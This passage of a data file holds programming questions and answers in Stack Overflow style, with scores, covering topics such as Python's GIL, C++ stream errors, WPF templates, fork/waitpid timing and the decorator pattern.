application\n\nTomcat 6\nExcerpted from Tomcat 6 page, Class Loader HOW-TO.\n\nTherefore, from the perspective of a web application, class or resource loading looks in the following repositories, in this order:\n\nBootstrap classes of your JVM\nSystem class loader classes (described above)\n/WEB-INF/classes of your web application\n/WEB-INF/lib/*.jar of your web application\n$CATALINA_HOME/lib\n$CATALINA_HOME/lib/*.jar\n\n", "score": 15}
{"title": "Why the Global Interpreter Lock?", "description": "What is exactly the function of Python's Global Interpreter Lock?\nDo other languages that are compiled to bytecode employ a similar mechanism?\n", "answer": "In general, for any thread safety problem you will need to protect your internal data structures with locks.\nThis can be done with various levels of granularity.\n\nYou can use fine-grained locking, where every separate structure has its own lock.\nYou can use coarse-grained locking where one lock protects everything (the GIL approach).\n\nThere are various pros and cons of each method.  Fine-grained locking allows greater parallelism - two threads can\nexecute in parallel when they don't share any resources.  However there is a much larger administrative overhead.  For\nevery line of code, you may need to acquire and release several locks.\nThe coarse grained approach is the opposite.  Two threads can't run at the same time, but an individual thread will run faster because its not doing so much bookkeeping.  Ultimately it comes down to a tradeoff between single-threaded speed and parallelism.\nThere have been a few attempts to remove the GIL in python, but the extra overhead for single threaded machines was generally too large.  Some cases can actually be slower even on multi-processor machines\ndue to lock contention.  \n\nDo other languages that are compiled to bytecode employ a similar mechanism?\n\nIt varies, and it probably shouldn't be considered a language property so much as an implementation property.\nFor instance, there are Python implementations such as Jython and IronPython which use the threading approach of their underlying VM, rather than a GIL approach. Additionally, the next version of Ruby looks to be moving towards introducing a GIL.\n", "score": 72}
{"title": "What's the best way to replace links with JS functions?", "description": "A pattern that's started to show up a lot in one of the web apps I'm working are links that used to just be a regular a-tag link now need a popup box asking \"are you sure?\" before the link will go.  (If the user hits cancel, nothing happens.)\nWe've got a solution that works, but somehow we're a web app shop without a Javascript expert, so I'm left with this crawling feeling like there's a better way to get the job done.\nSo, JS experts, what's the most standards-compliant, cross-browser way to get this done?\n(For the record, this is already a site that requires JS, so no need to have a \"non-JS\" version.  But, it does need to work in any and all reasonably modern browsers.)\n(Also, for bonus points it would be nice if people with JS turned off didn't have the links  work, rather than bypassing the confirm box.)\n", "answer": "Unobtrusive Javascript\nThe best practice is to add event handler methods to the links.\nThe confirm() function produces the dialog box you described, and returns true or false depending on the user's choice.\nEvent handler methods on links have a special behavior, which is that they kill the link action if they return false.\nvar link = document.getElementById('confirmToFollow');\n\nlink.onclick = function () {\n    return confirm(\"Are you sure?\");\n};\n\nIf you want the link to require javascript, the HTML must be edited.  Remove the href:\n<a href=\"#\" id=\"confirmToFollow\"...\n\nYou can explicitly set the link destination in the event handler:\nvar link = document.getElementById('confirmToFollow');\n\nlink.onclick = function () {\n    if( confirm(\"Are you sure?\") ) {\n        window.location = \"http://www.stackoverflow.com/\";\n    }\n    return false;\n};\n\nIf you want the same method called on multiple links, you can acquire a nodeList of the links you want, and apply the method to each as you loop through the nodeList:\nvar allLinks = document.getElementsByTagName('a');\nfor (var i=0; i < allLinks.length; i++) {\n    allLinks[i].onclick = function () {\n        return confirm(\"Are you sure?\");\n    };\n}\n\nThere are further permutations of the same idea here, such as using a classname to determine which links will listen for the method, and to pass a unique location into each based on some other criteria.  They are six of one, half dozen of another.\nAlternative Approaches (not encouraged practices):\nOne discouraged practice is to attach a method via an onclick attribute:\n<a href=\"mypage.html\" onclick=\"...\n\nAnother discouraged practice is to set the href attribute to a function call:\n<a href=\"javascript: confirmLink() ...\n\nNote that these discouraged practices are all working solutions.\n", "score": 14}
{"title": "infinite loop in c++", "description": "I'm learning C++ and writing little programs as I go along.  The following is one such program:\n// This program is intended to take any integer and convert to the\n// corresponding signed char.\n\n#include <iostream>\n\nint main()\n{\n  signed char sch = 0;\n  int n = 0;\n  while(true){\n    std::cin >> n;\n    sch = n;\n    std::cout << n << \" --> \" << sch << std::endl;\n  }\n}\n\nWhen I run this program and keep inputs at reasonably small absolute values, it behaves as expected.  But when I enter larger inputs, e.g., 10000000000, the program repetitively spits out the same output.  Some combinations of input cause erratic behavior.  For example:\n#: ./int2ch\n10\n10 --> \n\n10000000000\n10 -->\n\n10 -->\n\n10 -->\n\n10 -->\n\nThe program spits out \"10 -->  \" until it's killed.  (With this particular sequence of inputs, the program's output changes speed erratically.)  I also noticed that the output of large values is determined by the previous legal input as well as the value of the current illegal input.\nWhat's going on?  (I don't care about fixing the program, that's easy. I want to understand it.)\n", "answer": "Basically your cin stream is in a fail state and thus returns immediately when you try to read it. Rewrite your example like this:\n#include <iostream>\n\nint main()\n{\n  signed char sch = 0;\n  int n = 0;\n  while(std::cin >> n){\n    sch = n;\n    std::cout << n << \" --> \" << sch << std::endl;\n  }\n}\n\ncin >> n will return a reference to cin, which you can test for \"good-ness\" in a conditional. So basically the the \"while(std::cin >> n)\" is saying \"while i could still read from standard input successfully, do the following\"\nEDIT: the reason it repeatedly output the last good value entered is because that was the last value successfully read in n, the failed reads won't change the value of n\nEDIT: as noted in a comment, you can clear the error state and try again something like this would probably work and just ignore bad numbers:\n#include <iostream>\n#include <climits>\n\nint main() {\n    signed char sch = 0;\n    int n = 0;\n    while(true) {\n        if(std::cin >> n) {\n            sch = n;\n            std::cout << n << \" --> \" << sch << std::endl;\n        } else {\n            std::cin.clear(); // clear error state\n            std::cin.ignore(INT_MAX, '\\n'); // ignore this line we couldn't read it\n        }\n    }\n}\n\n", "score": 13}
{"title": "Java in Eclipse: Where do I put files on the filesystem that I want to load using getResource? (e.g. images for an ImageIcon)", "description": "I know the file needs to be where the getClass().getResource(filename) can find it, but I don't know where that is.\nI'm interested both in where to put the files on the filesystem itself, and how to go about using Eclipse's functionality to set up the resources.\n", "answer": "For Eclipse, typically all you need to do is set up a folder somewhere within your source code directory.  For instance, if the directory containing your source is /src then you can create a /src/resources folder to place your images/files in.  Then, within your class you do a getResource(\"/resources/image.png\") to retrieve it.  \nYou can also place the image/file within the same folder/package as the class trying to access it if you wish (example: place the image.png in the com.mycompany package with the com.mycompany.Foo class that needs to access it and call getResource(\"image.png\")), but I've found it's easier to keep resources like images and other files in their own special directory outside of the class folders -- they're just easier to manage that way.\nIn Eclipse, whenever you do a build, the files within this resource directory will be copied over into your build directory along with your compiled classes.  \nIt's important to note that if you have \"Build Automatically\" turned on in Eclipse (as most people do) any resources in this directory that get changed outside of Eclipse (i.e. you edit an image using an image editing tool) that the IDE may not always detect this change.  Usually doing a refresh on the project folder will ensure that the file gets updated in the build in these situations.\n", "score": 62}
{"title": "Difference between a LinkedList and a Binary Search Tree", "description": "What are the main differences between a Linked List and a BinarySearchTree? Is BST just a way of maintaining a LinkedList? My instructor talked about LinkedList and then BST but did't compare them or didn't say when to prefer one over another. This is probably a dumb question but I'm really confused. I would appreciate if someone can clarify this in a simple manner.\n", "answer": "Linked List:\nItem(1) -> Item(2) -> Item(3) -> Item(4) -> Item(5) -> Item(6) -> Item(7)\n\nBinary tree:\n                 Node(1)\n                /\n            Node(2)\n           /    \\\n          /      Node(3)\n  RootNode(4)\n          \\      Node(5)\n           \\    /\n            Node(6)\n                \\\n                 Node(7)\n\nIn a linked list, the items are linked together through a single next pointer.\nIn a binary tree, each node can have 0, 1 or 2 subnodes, where (in case of a binary search tree) the key of the left node is lesser than the key of the node and the key of the right node is more than the node. As long as the tree is balanced, the searchpath to each item is a lot shorter than that in a linked list.\nSearchpaths:\n------ ------ ------\nkey    List   Tree\n------ ------ ------\n1      1      3\n2      2      2\n3      3      3\n4      4      1\n5      5      3\n6      6      2\n7      7      3\n------ ------ ------\navg    4      2.43\n------ ------ ------\n\nBy larger structures the average search path becomes significant smaller:\n------ ------ ------\nitems  List   Tree\n------ ------ ------\n     1      1   1\n     3      2   1.67\n     7      4   2.43\n    15      8   3.29\n    31     16   4.16\n    63     32   5.09\n------ ------ ------\n\n", "score": 88}
{"title": "How do I detect when a removable disk is inserted using C#?", "description": "I'm just concerned about Windows, so there's no need to go into esoterica about Mono compatibility or anything like that.\nI should also add that the app that I'm writing is WPF, and I'd prefer to avoid taking a dependency on System.Windows.Forms if at all possible.\n", "answer": "Give this a shot...\nusing System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Management;\n\nnamespace WMITestConsolApplication\n{\n\n    class Program\n    {\n\n        static void Main(string[] args)\n        {\n\n            AddInsertUSBHandler();\n            AddRemoveUSBHandler();\n            while (true) {\n            }\n\n        }\n\n        static ManagementEventWatcher w = null;\n\n        static void AddRemoveUSBHandler()\n        {\n\n            WqlEventQuery q;\n            ManagementScope scope = new ManagementScope(\"root\\\\CIMV2\");\n            scope.Options.EnablePrivileges = true;\n\n            try {\n\n                q = new WqlEventQuery();\n                q.EventClassName = \"__InstanceDeletionEvent\";\n                q.WithinInterval = new TimeSpan(0, 0, 3);\n                q.Condition = \"TargetInstance ISA 'Win32_USBControllerdevice'\";\n                w = new ManagementEventWatcher(scope, q);\n                w.EventArrived += USBRemoved;\n\n                w.Start();\n            }\n            catch (Exception e) {\n\n                Console.WriteLine(e.Message);\n                if (w != null)\n                {\n                    w.Stop();\n\n                }\n            }\n\n        }\n\n        static void AddInsertUSBHandler()\n        {\n\n            WqlEventQuery q;\n            ManagementScope scope = new ManagementScope(\"root\\\\CIMV2\");\n            scope.Options.EnablePrivileges = true;\n\n            try {\n\n                q = new WqlEventQuery();\n                q.EventClassName = \"__InstanceCreationEvent\";\n                q.WithinInterval = new TimeSpan(0, 0, 3);\n                q.Condition = \"TargetInstance ISA 'Win32_USBControllerdevice'\";\n                w = new ManagementEventWatcher(scope, q);\n                w.EventArrived += USBInserted;\n\n                w.Start();\n            }\n            catch (Exception e) {\n\n                Console.WriteLine(e.Message);\n                if (w != null)\n                {\n                    w.Stop();\n\n                }\n            }\n\n        }\n\n        static void USBInserted(object sender, EventArgs e)\n        {\n\n            Console.WriteLine(\"A USB device inserted\");\n\n        }\n\n        static void USBRemoved(object sender, EventArgs e)\n        {\n\n            Console.WriteLine(\"A USB device removed\");\n\n        }\n    }\n\n}\n\n", "score": 16}
{"title": "Making a generic property", "description": "I have a class that stores a serialized value and a type. I want to have a property/method returning the value already casted:\npublic String Value { get; set; }\n\npublic Type TheType { get; set; }\n\npublic typeof(TheType) CastedValue { get { return Convert.ChangeType(Value, typeof(_Type)); }\n\nIs this possible in C#?\n", "answer": "It's possible if the class containing the property is generic, and you declare the property using the generic parameter:\nclass Foo<TValue> {\n    public string Value { get; set; }\n    public TValue TypedValue {\n        get {\n            return (TValue)Convert.ChangeType(Value, typeof(TValue));\n        }\n    }\n}\n\nAn alternative would be to use a generic method instead:\nclass Foo {\n    public string Value { get; set; }\n    public Type TheType { get; set; }\n\n    public T CastValue<T>() {\n         return (T)Convert.ChangeType(Value, typeof(T));\n    }\n}\n\nYou can also use the System.ComponentModel.TypeConverter classes to convert, since they allow a class to define it's own converter.\nEdit: note that when calling the generic method, you must specify the generic type parameter, since the compiler has no way to infer it:\nFoo foo = new Foo();\nfoo.Value = \"100\";\nfoo.Type = typeof(int);\n\nint c = foo.CastValue<int>();\n\nYou have to know the type at compile time.  If you don't know the type at compile time then you must be storing it in an object, in which case you can add the following property to the Foo class:\npublic object ConvertedValue {\n    get {\n        return Convert.ChangeType(Value, Type);\n    }\n}\n\n", "score": 112}
{"title": "How can I negate a functor in C++ (STL)?", "description": "I have some function to find a value:\nstruct FindPredicate\n{\n\n    FindPredicate(const SomeType& t) : _t(t) {\n    }\n    bool operator()(SomeType& t) {\n      return t == _t;\n    }\n\nprivate:\n    const SomeType& _t;\n};\n\nbool ContainsValue(std::vector<SomeType>& v, SomeType& valueToFind) {\n    return find_if(v.begin(), v.end(), FindPredicate(valueToFind)) != v.end();\n}\n\nNow I would like to write a function that checks if all members of a vector satisfy that predicate:\nbool AllSatisfy(std::vector<SomeType>& v) {\n    /* ... */\n}\n\nOne solution is to use the std::count_if algorithm.\nDoes anyone know a solution that involves negating the predicate?\n", "answer": "The best solution is to use the STL functional library. By deriving your predicate from unary_function<SomeType, bool> , you'll then be able to use the not1 function, which does precisely what you need (i.e. negating a unary predicate).\nHere is how you could do that :\nstruct FindPredicate : public unary_function<SomeType, bool>\n{\n    FindPredicate(const SomeType& t) : _t(t) {}\n\n    bool operator()(const SomeType& t) const {\n      return t == _t;\n    }\n\nprivate:\n    const SomeType& _t;\n};\n\nbool AllSatisfy(std::vector<SomeType>& v, SomeType& valueToFind)\n{\n    return find_if(v.begin(), \n                   v.end(), \n                   not1(FindPredicate(valueToFind))) == v.end();\n}\n\nIf you want to roll your own solution (which is, IMHO, not the best option...), well, you could write another predicate that is the negation of the first one :\nstruct NotFindPredicate\n{\n\n    NotFindPredicate(const SomeType& t) : _t(t) {\n    }\n    bool operator()(SomeType& t) {\n      return t != _t;\n    }\n\nprivate:\n    const SomeType& _t;\n};\n\nbool AllSatisfy(std::vector<SomeType>& v) {\n    return find_if(v.begin(), \n                   v.end(), \n                   NotFindPredicate(valueToFind)) == v.end();\n}\n\nOr you could do better and write a template functor negator, like :\ntemplate <class Functor>\nstruct Not\n{\n    Not(Functor & f) : func(f) {}\n\n    template <typename ArgType>\n    bool operator()(ArgType & arg) { return ! func(arg); }\n\n  private:\n    Functor & func;\n};\n\nthat you could use as follow :\nbool AllSatisfy(std::vector<SomeType>& v, SomeType& valueToFind)\n{\n    FindPredicate f(valueToFind);\n    return find_if(v.begin(), v.end(), Not<FindPredicate>(f)) == v.end();\n}\n\nOf course, the latter solution is better because you can reuse the Not struct with every functor you want.\n", "score": 21}
{"title": "Why do we need the decorator in the decorator design pattern?", "description": "Presuming I have a class named A, and I want to use the decorator design pattern. Correct me if I'm wrong, but for that to work , we'll need to create a decorator class, say ADecorator, which will hold a reference to an A instance, and all the other decorators will extend this to add functionality.\nI don't understand why do we have to create a decorator class, instead of using an A instance?\n", "answer": "The decorator pattern is used to add capabilities to objects dynamically (that is, at run time). Normally the object will have its capabilities fixed when you write the class. But an important point is that the functionality of the object is extended in a way that is transparent to the client of the object because it implements the same interface as the original object delegates responsibility to the decorated object.\nThe decorator pattern works in scenarios where there are many optional functionality that an object may have. Without the decorator pattern you will have to create a different class for each object-option configuration. One example that is pretty useful comes from the Head First Design Patterns book by O'Reilly. It uses a coffee shop example that sounds just like StarBucks.\nSo you have the basic coffee with a method like cost.\npublic double cost(){\n     return 3.45;\n}\n\nThen the customer can add cream which costs 0.35 so you now create a CoffeeCream class with the cost method:\npublic double cost(){\n    return 3.80;\n}\n\nThen the customer may want Mocha which costs 0.5, and they may want Mocha with Cream or Mocha without Cream. So you create classes CoffeeMochaCream and CoffeeMocha. Then a customer wants double cream so you create a class CoffeeCreamCream… etc. What you end up with is class explosion. Please excuse the poor example used. It's a bit late and I know it's trivial but it does express the point.\nInstead you can create an Item abstract class with an abstract cost method:\npublic abstract class Item{\n    public abstract double cost();\n}\n\nAnd you can create a concrete Coffee class that extends Item:\npublic class Coffee extends Item{\n    public double cost(){\n       return 3.45;\n    }\n}\n\nThen you create a CoffeeDecorator that extend the same interface and contain an Item.\npublic abstract class CoffeeDecorator extends Item{\n     private Item item;\n     ...\n}\n\nThen you can create concrete decorators for each option:\npublic class Mocha extends CoffeeDecorator{\n\n   public double cost(){\n     return item.cost() + 0.5;\n   }\n\n}\n\nNotice how the decorator does not care what type of object it is wrapping just as long as it's an Item? It uses the cost() of the item object and simply adds its own cost.\npublic class Cream extends CoffeeDecorator{\n\n   public double cost(){\n     return item.cost() + 0.35;\n   }\n\n}\n\nNow it is possible for a large number of configurations with these few classes:\ne.g.\n Item drink = new Cream(new Mocha(new Coffee))); //Mocha with cream\n\nor \n Item drink = new Cream(new Mocha(new Cream(new Coffee))));//Mocha with double cream\n\nAnd so on.\n", "score": 28}
{"title": "what is `int *userMask[3][4]` pointing to?", "description": "I am modifying some code and came across a declaration that I am having trouble understanding:\nint *userMask[3][4] = {0};\n\nWhat exactly is this pointing to?  Is it a matrix where every element is a pointer?  Or is it pointing to a matrix of size [3][4]?\nThanks\n\nI guess my question is how userMask[2][maskElement][user] can work when it is declared as int.  Wouldn't userMask have to be int[] for that to work properly?  I must not be understanding this right...\nOn a side note, thanks for your suggestion about cdecl Robert.  However, does anyone know how to use it in an XP command prompt?  All I can get is syntax error :(\n", "answer": "Short answer\nGiven userMask is declared as  \nint *userMask[3][4];\n\nthen userMask has type int*[3][4]. It's a 2d array of pointers to int. The size of the outer dimension is 3, the size of the inner dimension is 4. Really that is nothing more than a 3-element 1d array which element type is another 4-element 1d array which element type is int*.\nSteps explained\nSo if you do\nuserMask[2][maskElement][user]\n\nthen essentially with the first two indices you pick the particular pointer out of the 2d array:\nint * p = userMask[2][maskElement];\n\nthen you pick an int somewhere offset from that pointer by doing\np[user]\n\nnow that code is all in userMask[2][maskElement][user]. \nValid C Code\nTo do it step by step with valid c code (don't worry if you don't understand everything yet in the following):\nint * userMask[3][4] = { { 0 } };\nint ** pa = userMask[2]; /* int*[4] becomes int** implicitly */\nint * pi = pa[maskElement];\nint i = pi[user];\n\nassert(i == userMask[2][maskElement][user]);\n\nDifference between Arrays and Pointers\nSo i think i show you something important. The array above does not contain pointers to arrays. Lets look how different they behave, which many c programmers don't expect:\nint array[5][4][3];\n/* int[4][3] implicitly converts to int(*)[3] (pointer to first element) */\nint (*parray)[3] = array[0]; \nint ** pint = (int**) array[0]; /* wrong!! */\n\nNow, what will happen if we do parray[1] and pint[1] ? The first will advance parray by sizeof(int[3]) bytes (3 * sizeof(int)), the second will advance by only sizeof( int* ) bytes. So actually while the first gives you the correct array array[0][1], the second will give you ( char * )array[0] + sizeof( int* ), which is somewhere we don't really want it to be. But grabbing the wrong offset is not all about it. Because it doesn't know an array is accessed, it will try to interpret what is at pint[1] as an int*. Say your array was initialized with 0x00. Then it will do the next index step based off address 0x00 (Doing pint[1][0] for example). Oh noes - utterly undefined behavior! So it's really important to stress the difference.\nConclusion\nThis was more than you asked for, but I think it's quite important to know these details. Especially if you want to pass 2d arrays to functions then this knowledge is really useful. \n", "score": 43}
{"title": "Preventing AJAX memory leaks", "description": "I am working on a web application that is designed to display a bunch of data that is updated periodically with AJAX.   The general usage scenario would be that a user would leave it open all day and take a glance at it now and then.\nI am encountering a problem where the browsers memory footprint is growing slowly over time.   This is happening in both Firefox and IE 7 (Although not in Chrome). After a few hours, it can cause IE7 to have a footprint of ~200MB and FF3 to have a footprint of ~400MB.\nAfter a lot of testing, I have found that the memory leak only occurs if the AJAX calls are being responded to.  If the server doesn't respond to anything, I can leave the page open for hours and the footprint won't grow.\nI am using prototype for my AJAX calls.  So, I'm guessing there is an issue with the onSuccess callback creating these memory leaks.  \nDoes anyone have any tips on preventing memory leaks with prototype / AJAX?    Or any methods on how to troubleshoot this problem?\nEDIT: found out the issue lies in a js graphing library I am using.   Can be seen here. \n", "answer": "The biggest thing you can watch out for is events, and how you assign them.\nFor instance, take this scenario (since you haven't provided one):\n<div id=\"ajaxResponseTarget\">\n    ...\n</div>\n<script type=\"text/javascript\">\n    $(someButton).observe('click', function() {\n        new Ajax.Updater($('ajaxResponseTarget'), someUrl, {\n            onSuccess: function() {\n                $$('#ajaxResponseTarget .someButtonClass').invoke('observe', 'click', function() {\n                    ...\n                });\n            }\n        });\n    });\n</script>\n\nThis will create a memory leak, because when #ajaxResponseTarget is updated (internally, Prototype will use innerHTML) elements with click events will be removed from the document without their events being removed. The second time you click someButton, you will then have twice as many event handlers, and garbage collection can't remove the first set.\nA way to avoid this is to use event delegation:\n<div id=\"ajaxResponseTarget\">\n    ...\n</div>\n<script type=\"text/javascript\">\n    $('ajaxResponseTarget').observe('click', function(e) {\n        if(e.element().match('.someButtonClass')) {\n            ...\n        }\n    });\n    $(someButton).observe('click', function() {\n        new Ajax.Updater($('ajaxResponseTarget'), someUrl);\n    });\n</script>\n\nBecause of the way DOM events work, the \"click\" on .someButtonClass will fire also on #ajaxResponseTarget, and Prototype makes it dead simple to determine what element was the target of the event. No events are assigned to elements within #ajaxResponseTarget, so there is no way for replacing its contents to orphan events from targets within.\n", "score": 11}
{"title": "Checking if something was malloced", "description": "Given a pointer to some variable.. is there a way to check whether it was statically or dynamically allocated??  \n", "answer": "Quoting from your comment:\n\nim making a method that will basically get rid of a struct. it has a data member which is a pointer to something that may or may not be malloced.. depending on which one, i would like to free it\n\nThe correct way is to add another member to the struct: a pointer to a deallocation function.\nIt is not just static versus dynamic allocation. There are several possible allocators, of which malloc() is just one.\nOn Unix-like systems, it could be:\n\nA static variable\nOn the stack\nOn the stack but dynamically allocated (i.e. alloca())\nOn the heap, allocated with malloc()\nOn the heap, allocated with new\nOn the heap, in the middle of an array allocated with new[]\nOn the heap, within a struct allocated with malloc()\nOn the heap, within a base class of an object allocated with new\nAllocated with mmap\nAllocated with a custom allocator\nMany more options, including several combinations and variations of the above\n\nOn Windows, you also have several runtimes, LocalAlloc, GlobalAlloc, HeapAlloc (with several heaps which you can create easily), and so on.\nYou must always release memory with the correct release function for the allocator you used. So, either the part of the program responsible for allocating the memory should also free the memory, or you must pass the correct release function (or a wrapper around it) to the code which will free the memory.\nYou can also avoid the whole issue by either requiring the pointer to always be allocated with a specific allocator or by providing the allocator yourself (in the form of a function to allocate the memory and possibly a function to release it). If you provide the allocator yourself, you can even use tricks (like tagged pointers) to allow one to also use static allocation (but I will not go into the details of this approach here).\nRaymond Chen has a blog post about it (Windows-centric, but the concepts are the same everywhere): Allocating and freeing memory across module boundaries\n", "score": 11}
{"title": "WPF Custom Control with Item/Data Templates", "description": "I know how to create a custom user control in WPF but how can I make it so that someone can provide an ItemTemplate?\nI have a user control that is a mixture of several other WPF controls, one of them being a ListBox. I'd like to let the user of the control specify the content of the list box but I'm not sure how to pass that information through.\nEDIT: The accepted answer works with the following correction:\n<UserControl x:Class=\"WpfApplication6.MyControl\"\n    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n    xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n    xmlns:src=\"clr-namespace:WpfApplication6\">\n    <ListBox ItemTemplate=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type src:MyControl}}, Path=ItemsSource}\" />\n</UserControl>\n\n", "answer": "You will want to add a DependencyProperty to your control. The xaml will look slightly different if you are deriving from UserControl or Control.\npublic partial class MyControl : UserControl\n{\n    public MyControl()\n    {\n        InitializeComponent();\n    }\n\n    public static readonly DependencyProperty ItemTemplateProperty =\n        DependencyProperty.Register(\"ItemTemplate\", typeof(DataTemplate), typeof(MyControl), new UIPropertyMetadata(null));\n    public DataTemplate ItemTemplate\n    {\n        get { return (DataTemplate) GetValue(ItemTemplateProperty); }\n        set { SetValue(ItemTemplateProperty, value); }\n    }\n}\n\nHere is xaml for a UserControl.\n<UserControl x:Class=\"WpfApplication6.MyControl\"\n    xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"\n    xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"\n    xmlns:src=\"clr-namespace:WpfApplication6\">\n    <ListBox ItemTemplate=\"{Binding ItemTemplate, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type src:MyControl}}}\" />\n</UserControl>\n\nHere is xaml for a Control:\n<Style TargetType=\"{x:Type src:MyControl}\">\n    <Setter Property=\"Template\">\n        <Setter.Value>\n            <ControlTemplate TargetType=\"{x:Type src:MyControl}\">\n                <Border Background=\"{TemplateBinding Background}\"\n                        BorderBrush=\"{TemplateBinding BorderBrush}\"\n                        BorderThickness=\"{TemplateBinding BorderThickness}\">\n\n                    <ListBox ItemTemplate=\"{TemplateBinding ItemTemplate}\" />\n                </Border>\n            </ControlTemplate>\n        </Setter.Value>\n    </Setter>\n</Style>\n\n", "score": 15}
{"title": "How to wait until all child processes called by fork() complete?", "description": "I am forking a number of processes and I want to measure how long it takes to complete the whole task, that is when all processes forked are completed. Please advise how to make the parent process wait until all child processes are terminated? I want to make sure that I stop the timer at the right moment.\nHere is as a code I use:\n#include <iostream>\n#include <string>\n#include <fstream>\n#include <sys/time.h>\n#include <sys/wait.h>\n\nusing namespace std;\n\nstruct timeval first,  second,  lapsed;\nstruct timezone tzp; \n\nint main(int argc, char* argv[])// query, file, num. of processes.\n{\n\n    int pCount = 5; // process count\n\n    gettimeofday (&first, &tzp); //start time\n\n    pid_t* pID = new pid_t[pCount];\n\n    for(int indexOfProcess=0; indexOfProcess<pCount; indexOfProcess++)\n    {\n        pID[indexOfProcess]= fork();\n\n        if (pID[indexOfProcess] == 0)                // child\n        {\n            // code only executed by child process\n\n            // magic here\n\n            // The End\n            exit(0);\n        }\n        else if (pID[indexOfProcess] < 0)    // failed to fork\n        {\n            cerr << \"Failed to fork\" << endl;\n            exit(1);\n        }\n        else                         // parent\n        {\n            // if(indexOfProcess==pCount-1) and a loop with waitpid??\n\n            gettimeofday (&second, &tzp); //stop time\n            if (first.tv_usec > second.tv_usec)\n            {\n                second.tv_usec += 1000000;\n                second.tv_sec--;\n            }\n\n            lapsed.tv_usec = second.tv_usec - first.tv_usec;\n            lapsed.tv_sec = second.tv_sec - first.tv_sec; \n\n            cout << \"Job performed in \" <<lapsed.tv_sec << \" sec and \" << lapsed.tv_usec    << \" usec\"<< endl << endl;\n\n        }\n\n    }//for\n\n}//main\n\n", "answer": "I'd move everything after the line \"else //parent\" down, outside the for loop. After the loop of forks, do another for loop with waitpid, then stop the clock and do the rest:\nfor (int i = 0; i < pidCount; ++i) {\n    int status;\n    while (-1 == waitpid(pids[i], &status, 0));\n    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {\n        cerr << \"Process \" << i << \" (pid \" << pids[i] << \") failed\" << endl;\n        exit(1);\n    }\n}\n\ngettimeofday (&second, &tzp); //stop time\n\nI've assumed that if the child process fails to exit normally with a status of 0, then it didn't complete its work, and therefore the test has failed to produce valid timing data. Obviously if the child processes are supposed to be killed by signals, or exit non-0 return statuses, then you'll have to change the error check accordingly.\nAn alternative using wait:\nwhile (true) {\n    int status;\n    pid_t done = wait(&status);\n    if (done == -1) {\n        if (errno == ECHILD) break; // no more child processes\n    } else {\n        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {\n            cerr << \"pid \" << done << \" failed\" << endl;\n            exit(1);\n        }\n    }\n}\n\nThis one doesn't tell you which process in sequence failed, but if you care then you can add code to look it up in the pids array and get back the index.\n", "score": 22}
{"title": "C Inline Functions and Memory Use", "description": "If I use inline functions, does the memory usage increase?\n", "answer": "There are two kinds of memory usage that inline functions will affect:\ncode size — in general, inlining code will increase how much memory is used to load your program.  This is because there will be multiple copies of the generated code scattered around your program.  However, this isn't always true -- if your inlined function was only used once, there's little change, and if the inlined function is very small, you could get a net reduction in code size by removing the function call overhead.  Also, the function may be reduced in size by the optimizer that's able to remove code that's not used in the particular inline invocation.\nstack usage —  If your inlined functions have lots of local variables, then you may use more stack space.  In C, the compiler usually allocates the stack space for a function once upon entry to the function.  This has to be large enough to hold all the local variables that aren't stored in registers.  If you call a function out-of-line, the stack for that function is used until it returns, when it's released again.  If you inline the function, then that stack space will remain used for the whole life of the uber-function.\nInlining won't affect heap usage, as the same allocations and deallocations would occur for the inlined code as would occur for the non-inlined version.\n", "score": 10}
{"title": "How to get a file from sourcesafe programmatically?", "description": "I need to get a file from sourcesafe database programmatically. Any idea of how to do it? \nps: I'll do that by using C#.\n", "answer": "using System;\nusing System.Collections.Generic;\nusing SourceSafeTypeLib;\n\nnamespace YourNamespace\n{\n\npublic class SourceSafeDatabase \n{\n    private readonly string dbPath;\n    private readonly string password;\n    private readonly string rootProject;\n    private readonly string username;\n    private readonly VSSDatabaseClass vssDatabase;\n\n    public SourceSafeDatabase(string dbPath, string username, string password, string rootProject)\n    {\n        this.dbPath = dbPath;\n        this.username = username;\n        this.password = password;\n        this.rootProject = rootProject;\n\n        vssDatabase = new VSSDatabaseClass();\n    }  \n\n    public List<string> GetAllLabels()\n    {\n        List<string> allLabels = new List<string>();\n\n        VSSItem item = vssDatabase.get_VSSItem(rootProject, false);\n        IVSSVersions versions = item.get_Versions(0);\n\n        foreach (IVSSVersion version in versions)\n        {\n            if (version.Label.Length > 0)\n            {\n                allLabels.Add(version.Label);\n            }\n        }\n\n        return allLabels;\n    }\n\n    public void GetLabelledVersion(string label, string project, string directory)\n    {\n        string outDir = directory;\n        vssDatabase.get_VSSItem(rootProject, false).get_Version(label).Get(ref outDir, (int)VSSFlags.VSSFLAG_RECURSYES + (int)VSSFlags.VSSFLAG_USERRONO);\n    }\n\n    public void Open()\n    {\n        vssDatabase.Open(dbPath, username, password);\n    }\n\n    public void Close()\n    {\n        vssDatabase.Close();\n    }\n\n}\n\n// some other code that uses it\n\nSourceSafeDatabase sourceControlDatabase = new sourceControlDatabase(...);\nsourceControlDatabase.Open();\nsourceControlDatabase.GetLabelledVersion(label, rootProject, projectDirectory);\nsourceControlDatabase.Close();\n\n", "score": 10}
{"title": "What is a .NET proxy object in the Inversion of Control / Aspect-Oriented sense?", "description": "What is a proxy object in the Inversion of Control / Aspect-Oriented sense?\nAny good articles on what a proxy object is ?\nWhy you would want to use one ?\nAnd how to write one in C# ?  \n", "answer": "In general, a Proxy object is an object (instance of a class) that exposes the exact same public interface as a \"real class\" but simply forwards all calls made to it's members to the other real class.  Proxy objects are used for a variety of reasons... \nOne purpose is to \"pretend\" to be the real class so a client component (or object) can \"believe\" it's talking to the \"real\" object, but inside the proxy, other stuff, (like logging, transactional support, etc.) is being done at the same time... Secondly, a proxy can be very cheap in comparson to the real object,. and often is used so that the real objects can be conserved (turned off or released to a pool to be used by other clients) when the client is not using them... The proxy stays \"alive\" and the client thinks it still has a connection to the real object, but whenever it \"calls\" the object, it is actually calling the proxy, which goes and gets another real object just to handle the call, and then releases the real object when the call is done. \nAs to Inversion of Control (IOC).. That refers to a common pattern (also referred to as Dependency Injection),  where dependant objects inside of a class are \"injected\" into an instance 